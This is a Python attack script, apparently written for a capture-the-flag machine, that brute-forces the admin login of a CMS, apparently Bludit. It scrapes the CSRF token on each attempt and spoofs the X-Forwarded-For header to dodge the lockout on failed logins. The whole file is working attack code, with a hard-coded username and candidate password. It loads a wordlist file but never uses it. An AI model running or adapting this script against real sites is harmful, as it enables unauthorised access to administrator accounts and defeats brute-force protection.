import re
import requests

host = 'http://IP'
login_url = host + "/admin/login"
username = "fergus"
wordlist=[]

#to import wordlist form file 
def open_resuorces(file_path):
    return[item.replace('\n', '') for item in open(file_path).readlines()]

wordlistFile= open_resuorces("/root/wordlist.txt")

for i in range(2):
    wordlist.append('Password{i}'.format(i = i))

wordlist.append('RolandDeschain')


for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    
    print('[*] Trying {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF':csrf_token,
        'username':username,
        'password':password,
        'save':''
    }
    login_result = session.post(login_url, headers=headers, data=data, allow_redirects =False)

    if "location" in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS : Password found')
            print('USE {u}:{p}'.format(u = username, p = password))
            print(login_result.headers)
            break